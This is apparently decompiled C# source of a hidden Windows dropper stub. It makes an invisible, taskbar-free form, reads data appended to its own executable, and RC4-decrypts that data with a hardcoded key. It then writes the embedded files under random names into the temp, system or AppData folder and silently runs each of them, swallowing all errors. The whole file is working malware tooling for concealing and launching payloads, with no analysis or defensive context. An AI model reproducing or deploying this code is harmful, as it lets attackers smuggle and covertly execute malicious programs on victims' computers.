using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using ns3;

namespace ns4;

[DesignerGenerated]
internal class Form1 : Form
{
	private IContainer icontainer_0;

	private const string string_0 = "@#sp@##@s@lit#mixed";

	private const string string_1 = "Yod2ff86sd84f8r84bj84d3fgh68sdh6";

	private string string_2;

	private string[] string_3;

	private string string_4;

	private int int_0;

	public Form1()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && icontainer_0 != null)
			{
				icontainer_0.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		((Control)this).SuspendLayout();
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		Size clientSize = new Size(10, 10);
		((Form)this).set_ClientSize(clientSize);
		((Form)this).set_ControlBox(false);
		((Control)this).set_Enabled(false);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Form)this).set_WindowState((FormWindowState)1);
		((Control)this).ResumeLayout(false);
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	private void Form1_Load(object sender, EventArgs e)
	{
		FileSystem.FileOpen(1, Application.get_ExecutablePath(), (OpenMode)32, (OpenAccess)1, (OpenShare)(-1), -1);
		checked
		{
			string_2 = Strings.Space((int)FileSystem.LOF(1));
			FileSystem.FileGet(1, ref string_2, -1L, false);
			FileSystem.FileClose(new int[1] { 1 });
			string_3 = Strings.Split(string_2, "@#sp@##@s@lit#mixed", -1, (CompareMethod)0);
			int_0 = (int)Math.Round(Conversion.Val(smethod_0(string_3[1], "Yod2ff86sd84f8r84bj84d3fgh68sdh6")));
			string text = string_3[2];
			if (Operators.CompareString(text, smethod_0("TEMP", "Yod2ff86sd84f8r84bj84d3fgh68sdh6"), false) == 0)
			{
				string_4 = ((ServerComputer)Class17.Computer).get_FileSystem().get_SpecialDirectories().get_Temp() + "\\";
			}
			else if (Operators.CompareString(text, smethod_0("SYSTEM", "Yod2ff86sd84f8r84bj84d3fgh68sdh6"), false) == 0)
			{
				string_4 = Environment.SystemDirectory + "\\";
			}
			else if (Operators.CompareString(text, smethod_0("APPDATA", "Yod2ff86sd84f8r84bj84d3fgh68sdh6"), false) == 0)
			{
				string_4 = Environment.GetEnvironmentVariable("APPDATA") + "\\";
			}
			int num = int_0 + 2;
			for (int i = 3; i <= num; i++)
			{
				try
				{
					string[] array = Strings.Split(string_3[i], "#EXT#@is@here##", -1, (CompareMethod)0);
					string text2 = string_4 + method_1(10000, 99999) + smethod_0(array[1], "Yod2ff86sd84f8r84bj84d3fgh68sdh6");
					FileSystem.FileOpen(i, text2, (OpenMode)32, (OpenAccess)3, (OpenShare)(-1), -1);
					FileSystem.FilePut(i, smethod_0(array[0], "Yod2ff86sd84f8r84bj84d3fgh68sdh6"), -1L, false);
					FileSystem.FileClose(new int[1] { i });
					Process.Start(text2);
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
			ProjectData.EndApp();
		}
	}

	public static string smethod_0(string message, string password)
	{
		int num = 0;
		int num2 = 0;
		StringBuilder stringBuilder = new StringBuilder();
		string empty = string.Empty;
		int[] array = new int[257];
		int[] array2 = new int[257];
		int length = password.Length;
		int location = 0;
		while (location <= 255)
		{
			char c = password.Substring(location % length, 1).ToCharArray()[0];
			array2[location] = Strings.Asc(c);
			array[location] = location;
			Math.Max(Interlocked.Increment(ref location), checked(location - 1));
		}
		int num3 = 0;
		int location2 = 0;
		while (location2 <= 255)
		{
			num3 = checked(num3 + array[location2] + array2[location2]) % 256;
			int num4 = array[location2];
			array[location2] = array[num3];
			array[num3] = num4;
			Math.Max(Interlocked.Increment(ref location2), checked(location2 - 1));
		}
		location = 1;
		while (location <= message.Length)
		{
			int num5 = 0;
			num = checked(num + 1) % 256;
			num2 = checked(num2 + array[num]) % 256;
			num5 = array[num];
			array[num] = array[num2];
			array[num2] = num5;
			int num6 = array[checked(array[num] + array[num2]) % 256];
			checked
			{
				char c2 = message.Substring(location - 1, 1).ToCharArray()[0];
				num5 = Strings.Asc(c2);
				int num7 = num5 ^ num6;
				stringBuilder.Append(Strings.Chr(num7));
				Math.Max(Interlocked.Increment(ref location), location - 1);
			}
		}
		empty = stringBuilder.ToString();
		stringBuilder.Length = 0;
		return empty;
	}

	private string method_0(ref string strSource, ref string strStart, ref string strEnd, ref int startPos = 0)
	{
		int length = strStart.Length;
		string result = string.Empty;
		int num = strSource.IndexOf(strStart, startPos);
		checked
		{
			int num2 = strSource.IndexOf(strEnd, num + length);
			if (num != -1 && num2 != -1)
			{
				result = strSource.Substring(num + length, num2 - (num + length));
			}
			return result;
		}
	}

	private string method_1(int min, int max)
	{
		Random random = new Random();
		return random.Next(min, max).ToString();
	}
}
